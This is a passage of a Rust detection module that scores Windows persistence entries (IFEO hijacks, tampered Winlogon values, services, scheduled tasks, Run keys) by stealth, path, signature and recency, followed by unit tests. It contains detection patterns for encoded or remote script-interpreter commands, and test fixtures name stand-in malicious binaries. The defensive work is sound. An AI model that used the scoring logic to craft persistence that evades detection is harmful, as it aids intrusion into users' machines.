//! heur_persist (FR9 ranking, SRS §10): rank persistence records by mechanism stealth +
//! suspicious binary path + recent LastWrite. Emits a Finding per record that clears the
//! noise floor (weight >= 15). See score.rs for severity thresholds.
use crate::score::{
    is_inbox_service_command, is_suspicious_path, is_trusted_appdata_location, severity_for,
    Score,
};
use crate::trust::{
    is_masquerade, is_system_or_program_files, is_user_writable_path, winlogon_value_is_default,
};
use cairn_core::finding::{EntityFile, EntityRegistry};
use cairn_core::record::{PersistenceRecord, Record};
use cairn_core::traits::Analyzer;
use cairn_core::{Entity, Finding, FindingSource, Result, Severity};
use chrono::{DateTime, Duration, Utc};

/// Days within which a LastWrite counts as "recent" (a freshly-planted persistence entry).
const RECENT_DAYS: i64 = 7;

/// Score one persistence record. `now` is injected for testability (recency window).
fn score_persistence(p: &PersistenceRecord, now: DateTime<Utc>) -> Score {
    let mut s = Score::default();

    // Mechanism stealth: fewer legitimate uses -> higher base weight. Mutually exclusive.
    match p.mechanism.as_str() {
        "ifeo" => s.add(
            45,
            "IFEO Debugger hijack (almost never legitimate)",
            &["T1546.012"],
        ),
        "winlogon" => s.add(35, "Winlogon Shell/Userinit persistence", &["T1547.004"]),
        "service" => {
            let cmd = p.command.as_deref().unwrap_or("");
            let recently_modified = p.last_write.map(|lw| {
                let age = now.signed_duration_since(lw);
                age >= Duration::zero() && age <= Duration::days(RECENT_DAYS)
            }).unwrap_or(false);
            if is_inbox_service_command(cmd) && !recently_modified {
                return Score::default();
            }
            s.add(20, "service autostart persistence", &["T1543.003"]);
        }
        "scheduled_task" => s.add(20, "scheduled task persistence", &["T1053.005"]),
        "run_key" => s.add(10, "Run/RunOnce key persistence", &["T1547.001"]),
        "startup" => s.add(10, "Startup folder persistence", &["T1547.001"]),
        _ => {}
    }

    // Suspicious binary path — but NOT for the startup mechanism: the Startup folder is
    // itself the canonical persistence location, so its own path is not a suspicion
    // signal (the mechanism base weight already accounts for it). Other mechanisms point
    // at an arbitrary binary path, where Temp/AppData/etc. IS suspicious.
    let mut suspicious_path_fired = false;
    if p.mechanism != "startup" {
        if let Some(path) = p.binary_path.as_deref() {
            // S2-H: a SIGNED binary in the canonical per-user app install dir
            // (\AppData\Local\Programs\) is not a suspicion signal — that path is where
            // Notion/Warp/VS Code legitimately install. Fail-loud: only when signed==Some(true)
            // AND in that exact subpath; Temp/Roaming/unsigned/unverified still fire +30.
            let trusted_appdata = p.signed == Some(true) && is_trusted_appdata_location(path);
            if is_suspicious_path(path) && !trusted_appdata {
                s.add(
                    30,
                    format!("binary in a suspicious path: {path}"),
                    &["T1036"],
                );
                suspicious_path_fired = true;
            }
        }
    }

    // S2-H: a Winlogon entry carrying its STOCK default value, whose binary is not disproved
    // as unsigned, gets its recency dampened — a boot/update bumps the hive's last-write on
    // every clean machine, which would otherwise push the default values to High. Fail-loud:
    // any value change (e.g. "explorer.exe,evil.exe") or an unsigned body (signed==Some(false))
    // breaks the match and recency fires again. The winlogon base weight (35, Medium) always
    // remains, so the finding is never silenced — only lowered one band.
    let winlogon_default = p.mechanism == "winlogon"
        && p.signed != Some(false)
        && p.value
            .as_deref()
            .zip(p.command.as_deref())
            .is_some_and(|(v, c)| winlogon_value_is_default(v, c));
    if let Some(lw) = p.last_write {
        if !winlogon_default
            && now.signed_duration_since(lw) <= Duration::days(RECENT_DAYS)
            && now.signed_duration_since(lw) >= Duration::zero()
        {
            s.add(15, "recently created/modified (last 7 days)", &[]);
        }
    }

    // Unsigned amplifier: an unsigned binary is a signal only when it also sits in a
    // SUSPICIOUS PATH. We deliberately do NOT let recency alone license this: legitimate
    // inbox Windows drivers (catalog-signed, so WTD_CHOICE_FILE reports them unsigned) get
    // their last_write bumped by Windows Update, and service(20)+recency(15)+unsigned(20)
    // would falsely flag them High (observed in S2-D e2e). A genuinely planted unsigned
    // payload almost always also lives in a non-system path, which the path signal catches.
    // We never penalize the unverifiable (None) nor the trusted (Some(true)). `signed` is
    // backfilled by the persist collector via WinVerifyTrust (S2-D).
    if p.signed == Some(false) && suspicious_path_fired {
        s.add(20, "binary is unsigned (amplifies the above)", &["T1036"]);
    }

    s
}

/// One dispositive-signal hit (spec §4.2). `label` feeds the Finding title;
/// `reason` feeds Finding.reason (golden rule 6).
#[allow(dead_code)]
pub(crate) struct GateHit {
    pub severity: Severity,
    pub label: &'static str,
    pub reason: String,
    pub mitre: &'static str,
}

/// Bump one severity band (multi-signal / execution-corroboration escalation).
#[allow(dead_code)]
fn escalate(sev: Severity) -> Severity {
    match sev {
        Severity::Info => Severity::Low,
        Severity::Low => Severity::Medium,
        Severity::Medium => Severity::High,
        Severity::High | Severity::Critical => Severity::Critical,
    }
}

/// S9 (spec §4.2): persistence command invoking a script interpreter.
/// Encoded/remote content -> High; a plain local script file -> Low; else None.
/// The interpreter must be the invoked binary itself (basename of binary_path, or the
/// command's first token) — a substring match would flag "PowerShell Studio\app.exe".
#[allow(dead_code)]
fn script_persistence_signal(p: &PersistenceRecord) -> Option<GateHit> {
    const INTERPRETERS: &[&str] = &[
        "powershell.exe", "pwsh.exe", "wscript.exe", "cscript.exe", "mshta.exe", "cmd.exe",
        "powershell", "pwsh", "wscript", "cscript", "mshta", "cmd",
    ];
    let cmd = p.command.as_deref()?;
    let invoked = p
        .binary_path
        .as_deref()
        .map(|bp| short_name_persist(bp).to_ascii_lowercase())
        .or_else(|| {
            cmd.trim().trim_matches('"').split_whitespace().next().map(|t| {
                short_name_persist(t).to_ascii_lowercase()
            })
        })?;
    if !INTERPRETERS.contains(&invoked.as_str()) {
        return None;
    }
    let lower = cmd.to_ascii_lowercase();
    let encoded = lower.contains(" -enc")
        || lower.contains(" -encodedcommand")
        || lower.contains("frombase64string");
    let remote = lower.contains("http://") || lower.contains("https://");
    if encoded || remote {
        return Some(GateHit {
            severity: Severity::High,
            label: "腳本直譯器持久化（編碼/遠端內容）",
            reason: format!("persistence command runs {invoked} with encoded or remote content: {cmd}"),
            mitre: "T1059",
        });
    }
    const SCRIPT_EXTS: &[&str] = &[".vbs", ".vbe", ".js", ".jse", ".bat", ".ps1", ".hta"];
    if SCRIPT_EXTS.iter().any(|e| lower.contains(e)) {
        return Some(GateHit {
            severity: Severity::Low,
            label: "腳本檔持久化",
            reason: format!("persistence command runs {invoked} against a local script: {cmd}"),
            mitre: "T1059",
        });
    }
    None
}

/// Evaluate the dispositive-signal gate for one persistence record (spec §4.2).
/// Empty vec = no rare signal = inventory, not a detection (route to Observation).
#[allow(dead_code)]
pub(crate) fn evaluate_gate(p: &PersistenceRecord, now: DateTime<Utc>) -> Vec<GateHit> {
    let mut hits = Vec::new();
    let path = p.binary_path.as_deref().unwrap_or("");

    // S1a: winlogon value tampered (default values are inventory).
    if p.mechanism == "winlogon" {
        let is_default = p
            .value
            .as_deref()
            .zip(p.command.as_deref())
            .is_some_and(|(v, c)| winlogon_value_is_default(v, c));
        if !is_default {
            hits.push(GateHit {
                severity: Severity::High,
                label: "Winlogon 遭篡改",
                reason: format!(
                    "Winlogon {} is not the stock default: {}",
                    p.value.as_deref().unwrap_or("?"),
                    p.command.as_deref().unwrap_or("-")
                ),
                mitre: "T1547.004",
            });
        }
    }

    // S1b: IFEO debugger — always gates (rare); severity by target trust.
    if p.mechanism == "ifeo" {
        let untrusted = p.signed == Some(false) || is_user_writable_path(path);
        hits.push(GateHit {
            severity: if untrusted { Severity::High } else { Severity::Medium },
            label: "IFEO debugger 挾持",
            reason: format!(
                "IFEO Debugger set ({}); target {}",
                p.location,
                if untrusted { "unsigned or in a user-writable path" } else { "signed, system/vendor path (Process Explorer-style use)" }
            ),
            mitre: "T1546.012",
        });
    }

    // S2: explicitly unsigned + user-writable drop zone.
    if p.signed == Some(false) && is_user_writable_path(path) {
        hits.push(GateHit {
            severity: Severity::High,
            label: "未簽章執行檔於使用者可寫路徑",
            reason: format!("binary is explicitly unsigned and lives in a user-writable drop zone: {path}"),
            mitre: "T1036",
        });
    }

    // S3: system-name masquerade (absolute path outside C:\Windows).
    if is_masquerade(path) {
        hits.push(GateHit {
            severity: Severity::High,
            label: "系統程式名稱偽裝",
            reason: format!("system binary name at a non-Windows location: {path}"),
            mitre: "T1036.005",
        });
    }

    // S4: recent + unverifiable + outside system/vendor dirs — all three required.
    // Recency ALONE is dead (update-day mass rewrites, per-user service instances).
    if p.signed.is_none() && !path.is_empty() && !is_system_or_program_files(path) {
        if let Some(lw) = p.last_write {
            let age = now.signed_duration_since(lw);
            if age >= Duration::zero() && age <= Duration::days(RECENT_DAYS) {
                hits.push(GateHit {
                    severity: Severity::Medium,
                    label: "近期建立且簽章無法驗證",
                    reason: format!(
                        "created/modified within {RECENT_DAYS} days, signature unverifiable, non-system path: {path}"
                    ),
                    mitre: "T1547",
                });
            }
        }
    }

    // S9: script-interpreter persistence.
    if let Some(hit) = script_persistence_signal(p) {
        hits.push(hit);
    }

    hits
}

/// Return the bare file name from a command/path string (strips surrounding quotes too).
fn short_name_persist(path: &str) -> String {
    path.trim_matches('"')
        .rsplit(['\\', '/'])
        .next()
        .unwrap_or(path)
        .to_owned()
}

/// Build a human-readable details string for a persistence finding.
fn format_persist_details(p: &PersistenceRecord) -> String {
    let svc_name = p.location.rsplit('\\').next().unwrap_or(&p.location);
    let cmd = p.command.as_deref().unwrap_or("-");
    let bin_short = short_name_persist(cmd);
    let date = p
        .last_write
        .map(|lw| lw.format("%Y-%m-%d").to_string())
        .unwrap_or_else(|| "unknown".into());
    match p.mechanism.as_str() {
        "service"        => format!("服務 {} → {} ({})", svc_name, bin_short, date),
        "run_key"        => format!("Run 鍵: {} → {} ({})", svc_name, bin_short, date),
        "scheduled_task" => format!("排程工作: {} → {} ({})", svc_name, bin_short, date),
        "winlogon"       => format!("Winlogon {}: {}", p.value.as_deref().unwrap_or("?"), cmd),
        "ifeo"           => format!("IFEO {}: {} → {}", svc_name, svc_name, bin_short),
        "startup"        => format!("Startup: {} ({})", bin_short, date),
        _                => format!("{}: {} → {}", p.mechanism, svc_name, bin_short),
    }
}

/// Analyzer: ranks persistence records, emitting findings above the noise floor.
pub struct PersistHeuristic;

impl Analyzer for PersistHeuristic {
    fn name(&self) -> &str {
        "heur_persist"
    }

    fn analyze(&self, records: &[Record]) -> Result<Vec<Finding>> {
        let now = Utc::now();
        let mut out = Vec::new();
        for r in records {
            let Record::Persistence(p) = r else { continue };
            let score = score_persistence(p, now);
            let Some(severity) = severity_for(score.weight) else {
                continue;
            };

            let mut f = Finding::new(
                severity,
                format!("Suspicious persistence: {}", p.mechanism),
                FindingSource::Heuristic,
            );
            f.reason = Some(score.reasons.join("; "));
            f.mitre = score.mitre;
            f.artifact = "persistence".into();
            f.details = format_persist_details(p);
            f.ts = p.last_write.unwrap_or(now);
            f.entity = persistence_entity(p);
            out.push(f);
        }
        Ok(out)
    }
}

/// Build the entity: registry-backed mechanisms -> entity.registry; the file-backed
/// `startup` mechanism -> entity.file (SRS §5.1 mapping in the design spec).
fn persistence_entity(p: &PersistenceRecord) -> Entity {
    if p.mechanism == "startup" {
        Entity {
            file: Some(EntityFile {
                path: p
                    .binary_path
                    .clone()
                    .or_else(|| p.value.clone())
                    .unwrap_or_default(),
                sha256: None,
                mtime: p.last_write,
                si_btime: None,
                fn_btime: None,
                si_mtime: None,
                fn_mtime: None,
                path_complete: None,
            }),
            ..Entity::default()
        }
    } else {
        Entity {
            registry: Some(EntityRegistry {
                hive: hive_prefix(&p.location),
                key: p.location.clone(),
                value: p.value.clone().unwrap_or_default(),
                data: p.command.clone().unwrap_or_default(),
                last_write: p.last_write,
            }),
            ..Entity::default()
        }
    }
}

/// Parse the hive prefix ("HKLM"/"HKCU"/...) from a registry location string; "" if none.
fn hive_prefix(location: &str) -> String {
    location
        .split(['\\', '/'])
        .next()
        .filter(|h| h.starts_with("HK"))
        .unwrap_or("")
        .to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rec(
        mechanism: &str,
        binary_path: Option<&str>,
        last_write: Option<DateTime<Utc>>,
    ) -> PersistenceRecord {
        PersistenceRecord {
            mechanism: mechanism.into(),
            location: "HKLM\\...\\Run".into(),
            value: Some("Updater".into()),
            command: binary_path.map(|p| p.to_string()),
            binary_path: binary_path.map(|p| p.to_string()),
            binary_sha256: None,
            signed: None,
            signer: None,
            last_write,
        }
    }

    /// An IFEO Debugger in Temp written today scores critical and tags T1546.012.
    #[test]
    fn ifeo_in_temp_recent_scores_critical() {
        let now = Utc::now();
        let p = rec(
            "ifeo",
            Some(r"C:\Users\a\AppData\Local\Temp\dbg.exe"),
            Some(now),
        );
        let s = score_persistence(&p, now);
        // ifeo 45 + suspicious path 30 + recent 15 = 90
        assert!(s.weight >= 70, "weight {}", s.weight);
        assert!(s.mitre.contains(&"T1546.012".to_string()));
    }

    /// A plain old Run key to Program Files scores below the floor (quiet for legit).
    #[test]
    fn old_run_key_program_files_is_quiet() {
        let now = Utc::now();
        let old = now - Duration::days(400);
        let p = rec(
            "run_key",
            Some(r"C:\Program Files\Vendor\app.exe"),
            Some(old),
        );
        let s = score_persistence(&p, now);
        // run_key 10 only -> below floor (15) -> no finding
        assert!(s.weight < 15, "weight {}", s.weight);
    }

    /// Winlogon tampering scores high even without a suspicious path.
    #[test]
    fn winlogon_scores_high_band() {
        let now = Utc::now();
        let p = rec(
            "winlogon",
            Some(r"C:\Windows\System32\userinit.exe"),
            Some(now),
        );
        let s = score_persistence(&p, now);
        // winlogon 35 + recent 15 = 50 -> high
        assert!(s.weight >= 50, "weight {}", s.weight);
    }

    /// The recency window: 6 days fires, 8 days does not.
    #[test]
    fn recency_window_boundary() {
        let now = Utc::now();
        let p6 = rec(
            "service",
            Some(r"C:\Windows\System32\svc.exe"),
            Some(now - Duration::days(6)),
        );
        let p8 = rec(
            "service",
            Some(r"C:\Windows\System32\svc.exe"),
            Some(now - Duration::days(8)),
        );
        assert!(score_persistence(&p6, now)
            .reasons
            .iter()
            .any(|r| r.contains("recently")));
        assert!(!score_persistence(&p8, now)
            .reasons
            .iter()
            .any(|r| r.contains("recently")));
    }

    /// Missing binary_path and missing last_write: still scores the mechanism, no panic.
    #[test]
    fn missing_fields_still_score_mechanism() {
        let now = Utc::now();
        let p = rec("ifeo", None, None);
        let s = score_persistence(&p, now);
        assert_eq!(s.weight, 45); // mechanism only
    }

    /// An unknown mechanism (e.g. one not yet implemented, like wmi_subscription) scores 0
    /// from the mechanism match — guards the wildcard arm against accidental scoring.
    #[test]
    fn unknown_mechanism_scores_zero() {
        let now = Utc::now();
        let p = rec("wmi_subscription", None, None);
        let s = score_persistence(&p, now);
        assert_eq!(s.weight, 0);
    }

    /// A recent startup item scores startup(10) + recent(15) = 25 (Low). The startup folder
    /// path itself must NOT add the suspicious-path signal (it is the canonical location).
    #[test]
    fn startup_recent_scores_low_without_path_signal() {
        let now = Utc::now();
        let p = rec(
            "startup",
            Some(r"C:\Users\a\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\x.lnk"),
            Some(now),
        );
        let s = score_persistence(&p, now);
        assert_eq!(s.weight, 25, "startup(10)+recent(15), no path signal");
        assert!(
            !s.reasons.iter().any(|r| r.contains("suspicious path")),
            "startup folder path must not trigger the suspicious-path signal"
        );
    }

    /// Like `rec` but with an explicit `signed` value (for amplifier tests).
    fn rec_signed(
        mechanism: &str,
        binary_path: Option<&str>,
        last_write: Option<DateTime<Utc>>,
        signed: Option<bool>,
    ) -> PersistenceRecord {
        let mut r = rec(mechanism, binary_path, last_write);
        r.signed = signed;
        r
    }

    /// Like `rec_signed` but lets the test set the registry `value` and `command`
    /// independently (the Winlogon gate keys off `value`; the existing `rec` hardcodes it).
    fn rec_full(
        mechanism: &str,
        value: &str,
        command: &str,
        binary_path: Option<&str>,
        last_write: Option<DateTime<Utc>>,
        signed: Option<bool>,
    ) -> PersistenceRecord {
        PersistenceRecord {
            mechanism: mechanism.into(),
            location: "HKLM\\...\\Run".into(),
            value: Some(value.into()),
            command: Some(command.into()),
            binary_path: binary_path.map(|p| p.to_string()),
            binary_sha256: None,
            signed,
            signer: None,
            last_write,
        }
    }

    // --- S2-I: scheduled_task mechanism (weight 20, service band) ---

    /// A scheduled_task in a normal path, signed, old: base 20 only (Low band, like service).
    #[test]
    fn scheduled_task_normal_path_is_low() {
        let now = Utc::now();
        let old = now - Duration::days(400);
        let p = rec_signed(
            "scheduled_task",
            Some(r"C:\Windows\System32\sc.exe"),
            Some(old),
            Some(true),
        );
        let s = score_persistence(&p, now);
        assert_eq!(s.weight, 20, "scheduled_task base only");
        assert!(s.reasons.iter().any(|r| r.contains("scheduled task")));
        assert!(s.mitre.contains(&"T1053.005".to_string()));
    }

    /// An unsigned scheduled_task in Temp: base 20 + path 30 + unsigned 20 = High (fail-loud).
    #[test]
    fn scheduled_task_unsigned_in_temp_is_high() {
        let now = Utc::now();
        let old = now - Duration::days(400);
        let p = rec_signed(
            "scheduled_task",
            Some(r"C:\Users\x\AppData\Local\Temp\evil.exe"),
            Some(old),
            Some(false),
        );
        let s = score_persistence(&p, now);
        assert_eq!(s.weight, 70, "task 20 + path 30 + unsigned 20");
    }

    // --- S2-H Gate 2: trusted AppData location suppresses the suspicious-path signal ---

    /// Signed per-user app in AppData\Local\Programs: suspicious-path +30 is suppressed,
    /// dropping it from High (55) to Low (25). The finding still surfaces, just not as High.
    #[test]
    fn signed_appdata_local_programs_suppresses_path_signal() {
        let now = Utc::now();
        let p = rec_signed(
            "run_key",
            Some(r"C:\Users\bosen\AppData\Local\Programs\Notion\Notion.exe"),
            Some(now),
            Some(true),
        );
        let s = score_persistence(&p, now);
        assert_eq!(s.weight, 25, "run_key 10 + recent 15; path +30 suppressed");
        assert!(!s.reasons.iter().any(|r| r.contains("suspicious path")));
        assert!(!s.reasons.iter().any(|r| r.contains("unsigned")));
    }

    /// Unsigned binary in the SAME trusted location is NOT suppressed (fail-loud): the path
    /// signal fires and so does the unsigned amplifier.
    #[test]
    fn unsigned_appdata_local_programs_not_suppressed() {
        let now = Utc::now();
        let old = now - Duration::days(400); // isolate path + amplifier from recency
        let p = rec_signed(
            "run_key",
            Some(r"C:\Users\x\AppData\Local\Programs\et\evil.exe"),
            Some(old),
            Some(false),
        );
        let s = score_persistence(&p, now);
        assert_eq!(s.weight, 60, "run_key 10 + path 30 + unsigned 20");
        assert!(s.reasons.iter().any(|r| r.contains("suspicious path")));
    }

    /// Signed binary in AppData\Local\TEMP is NOT suppressed (wrong subpath): path fires.
    #[test]
    fn signed_appdata_temp_not_suppressed() {
        let now = Utc::now();
        let p = rec_signed(
            "run_key",
            Some(r"C:\Users\x\AppData\Local\Temp\app.exe"),
            Some(now),
            Some(true),
        );
        let s = score_persistence(&p, now);
        // run_key 10 + path 30 + recent 15 = 55 (signed -> no unsigned amplifier)
        assert_eq!(
            s.weight, 55,
            "temp is not a trusted location; path +30 stays"
        );
        assert!(s.reasons.iter().any(|r| r.contains("suspicious path")));
    }

    /// None signature in the trusted location is NOT suppressed (unverified, fail-loud).
    #[test]
    fn unverified_appdata_local_programs_not_suppressed() {
        let now = Utc::now();
        let p = rec_signed(
            "run_key",
            Some(r"C:\Users\x\AppData\Local\Programs\App\a.exe"),
            Some(now),
            None,
        );
        let s = score_persistence(&p, now);
        // run_key 10 + path 30 + recent 15 = 55 (None -> not suppressed, no amplifier)
        assert_eq!(s.weight, 55, "None signature must not earn suppression");
    }

    // --- S2-H Gate 1: stock Winlogon default value suppresses the recency signal ---

    /// Stock Winlogon Shell, recently written, signature unverifiable (explorer.exe has no
    /// absolute path -> signed None): recency +15 suppressed, dropping High (50) to Medium (35).
    #[test]
    fn winlogon_default_shell_suppresses_recency() {
        let now = Utc::now();
        let p = rec_full("winlogon", "Shell", "explorer.exe", None, Some(now), None);
        let s = score_persistence(&p, now);
        assert_eq!(s.weight, 35, "winlogon 35; recency +15 suppressed");
        assert!(!s.reasons.iter().any(|r| r.contains("recently")));
    }

    /// Stock Winlogon Userinit (comma + case variant), recent, None signed: recency suppressed.
    #[test]
    fn winlogon_default_userinit_suppresses_recency() {
        let now = Utc::now();
        let p = rec_full(
            "winlogon",
            "Userinit",
            r"C:\WINDOWS\system32\userinit.exe,",
            Some(r"C:\WINDOWS\system32\userinit.exe"),
            Some(now),
            None,
        );
        let s = score_persistence(&p, now);
        assert_eq!(s.weight, 35, "winlogon 35; recency +15 suppressed");
    }

    /// Tampered Winlogon Shell (appended payload), recent: NOT suppressed -> stays High (50).
    #[test]
    fn winlogon_tampered_shell_not_suppressed() {
        let now = Utc::now();
        let p = rec_full(
            "winlogon",
            "Shell",
            "explorer.exe,evil.exe",
            Some(r"C:\Temp\evil.exe"),
            Some(now),
            None,
        );
        let s = score_persistence(&p, now);
        // winlogon 35 + recent 15 = 50 (tampered value -> recency NOT suppressed)
        assert!(
            s.weight >= 50,
            "tampered value must stay High; weight {}",
            s.weight
        );
    }

    /// Stock Winlogon value but the binary is DISPROVED as unsigned (signed==Some(false)):
    /// NOT suppressed (fail-loud on a swapped-but-named-explorer body) -> stays High (50).
    #[test]
    fn winlogon_default_value_unsigned_binary_not_suppressed() {
        let now = Utc::now();
        let p = rec_full(
            "winlogon",
            "Shell",
            "explorer.exe",
            Some(r"C:\Windows\explorer.exe"),
            Some(now),
            Some(false),
        );
        let s = score_persistence(&p, now);
        assert!(
            s.weight >= 50,
            "unsigned body must stay High; weight {}",
            s.weight
        );
    }

    /// Unsigned + suspicious path: amplifier fires (+20), reason mentions unsigned.
    #[test]
    fn unsigned_amplifies_suspicious_path() {
        let now = Utc::now();
        let old = now - Duration::days(400); // no recency, isolate the path signal
        let p = rec_signed(
            "run_key",
            Some(r"C:\Users\a\AppData\Local\Temp\x.exe"),
            Some(old),
            Some(false),
        );
        let s = score_persistence(&p, now);
        assert_eq!(s.weight, 60, "run_key 10 + path 30 + unsigned 20");
        assert!(s.reasons.iter().any(|r| r.contains("unsigned")));
        assert!(s.mitre.contains(&"T1036".to_string()));
    }

    /// Unsigned in a NORMAL path, old: amplifier does NOT fire (no other signal).
    #[test]
    fn unsigned_alone_does_not_amplify() {
        let now = Utc::now();
        let old = now - Duration::days(400);
        let p = rec_signed(
            "run_key",
            Some(r"C:\Program Files\Vendor\app.exe"),
            Some(old),
            Some(false),
        );
        let s = score_persistence(&p, now);
        assert_eq!(s.weight, 10, "run_key only; amplifier off");
        assert!(!s.reasons.iter().any(|r| r.contains("unsigned")));
    }

    /// Signed (Some(true)) in a suspicious path: amplifier does NOT fire.
    #[test]
    fn signed_does_not_amplify() {
        let now = Utc::now();
        let old = now - Duration::days(400);
        let p = rec_signed(
            "run_key",
            Some(r"C:\Users\a\AppData\Local\Temp\x.exe"),
            Some(old),
            Some(true),
        );
        let s = score_persistence(&p, now);
        assert_eq!(s.weight, 40, "run_key 10 + path 30; signed -> no amplifier");
        assert!(!s.reasons.iter().any(|r| r.contains("unsigned")));
    }

    /// Unknown signature (None) in a suspicious path: amplifier does NOT fire.
    #[test]
    fn unknown_signature_does_not_amplify() {
        let now = Utc::now();
        let old = now - Duration::days(400);
        let p = rec_signed(
            "run_key",
            Some(r"C:\Users\a\AppData\Local\Temp\x.exe"),
            Some(old),
            None,
        );
        let s = score_persistence(&p, now);
        assert_eq!(s.weight, 40, "run_key 10 + path 30; None -> no amplifier");
    }

    /// Unsigned + recent but NORMAL path: amplifier does NOT fire — recency alone must not
    /// license it. Regression for the S2-D e2e false positive: legitimate catalog-signed
    /// inbox drivers (reported unsigned by WTD_CHOICE_FILE) get their last_write bumped by
    /// Windows Update; service(20)+recency(15)+unsigned(20)=55 would have wrongly flagged
    /// them High. With the amplifier gated on suspicious-path only, this stays Medium (35).
    #[test]
    fn unsigned_recent_normal_path_does_not_amplify() {
        let now = Utc::now();
        let p = rec_signed(
            "service",
            Some(r"C:\Windows\System32\DriverStore\drv.sys"), // legit driver location
            Some(now),                                        // recently serviced
            Some(false),                                      // catalog-signed -> reported unsigned
        );
        let s = score_persistence(&p, now);
        // service 20 + recent 15 = 35 (Medium); NO unsigned amplifier (no suspicious path)
        assert_eq!(
            s.weight, 35,
            "service 20 + recent 15; amplifier OFF without a suspicious path"
        );
        assert!(
            !s.reasons.iter().any(|r| r.contains("unsigned")),
            "recency alone must not trigger the unsigned amplifier"
        );
    }

    use cairn_core::record::Record;
    use cairn_core::traits::Analyzer;

    /// The analyzer emits one Heuristic finding for a malicious IFEO record (reason +
    /// registry entity) and nothing for a quiet old Run key.
    #[test]
    fn analyzer_emits_finding_for_malicious_only() {
        let now = Utc::now();
        let bad = Record::Persistence(rec(
            "ifeo",
            Some(r"C:\Users\a\AppData\Local\Temp\dbg.exe"),
            Some(now),
        ));
        let quiet = Record::Persistence(rec(
            "run_key",
            Some(r"C:\Program Files\V\a.exe"),
            Some(now - Duration::days(400)),
        ));
        let findings = PersistHeuristic.analyze(&[bad, quiet]).expect("analyze");
        assert_eq!(findings.len(), 1);
        let f = &findings[0];
        assert!(matches!(f.source, cairn_core::FindingSource::Heuristic));
        assert!(f.reason.is_some());
        assert_eq!(f.artifact, "persistence");
        assert!(f.entity.registry.is_some(), "ifeo is registry-backed");
        assert!(f.mitre.contains(&"T1546.012".to_string()));
    }

    // --- R1b: inbox-service suppress gate ---

    fn svc(command: &str, last_write: Option<DateTime<Utc>>) -> PersistenceRecord {
        PersistenceRecord {
            mechanism: "service".into(),
            location: r"HKLM\SYSTEM\CurrentControlSet\Services\TestSvc".into(),
            value: Some("TestSvc".into()),
            command: Some(command.into()),
            binary_path: None,
            binary_sha256: None,
            signed: None,
            signer: None,
            last_write,
        }
    }

    #[test]
    fn old_inbox_svchost_suppressed() {
        let now = chrono::Utc::now();
        let old = now - chrono::Duration::days(400);
        let p = svc(r"%SystemRoot%\system32\svchost.exe -k DcomLaunch -p", Some(old));
        let s = score_persistence(&p, now);
        assert_eq!(s.weight, 0, "inbox svchost must be suppressed, weight={}", s.weight);
        assert!(s.reasons.is_empty());
    }

    #[test]
    fn old_inbox_driver_suppressed() {
        let now = chrono::Utc::now();
        let old = now - chrono::Duration::days(30);
        let p = svc(r"System32\drivers\tcpip.sys", Some(old));
        let s = score_persistence(&p, now);
        assert_eq!(s.weight, 0, "inbox driver must be suppressed");
    }

    #[test]
    fn recent_inbox_svchost_not_suppressed() {
        let now = chrono::Utc::now();
        let recent = now - chrono::Duration::days(3);
        let p = svc(
            r"%SystemRoot%\system32\svchost.exe -k ClipboardSvcGroup -p",
            Some(recent),
        );
        let s = score_persistence(&p, now);
        assert!(s.weight >= 15, "recent inbox svchost must NOT be suppressed, weight={}", s.weight);
        assert!(s.reasons.iter().any(|r| r.contains("service autostart")));
    }

    #[test]
    fn driverstore_oem_not_suppressed() {
        let now = chrono::Utc::now();
        let old = now - chrono::Duration::days(400);
        let p = svc(
            r"%SystemRoot%\System32\DriverStore\FileRepository\asusatp.inf_amd64\AsusATP.exe",
            Some(old),
        );
        let s = score_persistence(&p, now);
        assert_eq!(s.weight, 20, "DriverStore must not be suppressed, weight={}", s.weight);
    }

    #[test]
    fn program_files_service_not_suppressed() {
        let now = chrono::Utc::now();
        let old = now - chrono::Duration::days(400);
        let p = svc(
            r#""C:\Program Files\WindowsApps\Claude_1.15\app\resources\cowork-svc.exe""#,
            Some(old),
        );
        let s = score_persistence(&p, now);
        assert_eq!(s.weight, 20, "non-inbox service must score normally, weight={}", s.weight);
    }

    #[test]
    fn no_last_write_treated_as_not_recent() {
        let now = chrono::Utc::now();
        let p = svc(r"%SystemRoot%\system32\sppsvc.exe", None);
        let s = score_persistence(&p, now);
        assert_eq!(s.weight, 0, "inbox with no last_write must suppress");
    }

    /// A startup (file) mechanism populates entity.file, not entity.registry.
    #[test]
    fn startup_mechanism_uses_file_entity() {
        let now = Utc::now();
        let mut r = rec(
            "startup",
            Some(r"C:\Users\a\AppData\Roaming\...\Startup\x.exe"),
            Some(now),
        );
        r.location = r"C:\Users\a\...\Startup".into();
        let findings = PersistHeuristic
            .analyze(&[Record::Persistence(r)])
            .expect("analyze");
        assert_eq!(findings.len(), 1);
        let f = &findings[0];
        assert!(f.entity.file.is_some());
        assert!(f.entity.registry.is_none());
    }

    // --- R6: human-readable details field ---

    #[test]
    fn service_details_format() {
        let now = Utc::now();
        let p = PersistenceRecord {
            mechanism: "service".into(),
            location: r"HKLM\SYSTEM\CurrentControlSet\Services\CoworkVMService".into(),
            value: Some("CoworkVMService".into()),
            command: Some(r#""C:\Program Files\WindowsApps\Claude\cowork-svc.exe""#.into()),
            binary_path: None,
            binary_sha256: None,
            signed: None,
            signer: None,
            last_write: Some(now - Duration::days(2)),
        };
        // This service is non-inbox and recently modified — it will score and produce a finding.
        let details = format_persist_details(&p);
        assert!(details.contains("CoworkVMService"), "service name missing: {details}");
        assert!(details.contains("cowork-svc.exe"), "binary short name missing: {details}");
        assert!(!details.contains("mechanism="), "must not use debug key=value format: {details}");
    }

    #[test]
    fn winlogon_details_format() {
        let p = PersistenceRecord {
            mechanism: "winlogon".into(),
            location: r"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon".into(),
            value: Some("Shell".into()),
            command: Some("explorer.exe,evil.exe".into()),
            binary_path: None,
            binary_sha256: None,
            signed: None,
            signer: None,
            last_write: None,
        };
        let details = format_persist_details(&p);
        assert!(
            details.contains("Winlogon") || details.contains("Shell"),
            "must mention Winlogon or the value name: {details}"
        );
        assert!(!details.contains("mechanism="), "must not use debug format: {details}");
    }

    #[test]
    fn ifeo_details_format() {
        let now = Utc::now();
        let p = rec("ifeo", Some(r"C:\Users\a\AppData\Local\Temp\dbg.exe"), Some(now));
        let details = format_persist_details(&p);
        assert!(details.starts_with("IFEO"), "must start with IFEO: {details}");
        assert!(details.contains("dbg.exe"), "must contain binary name: {details}");
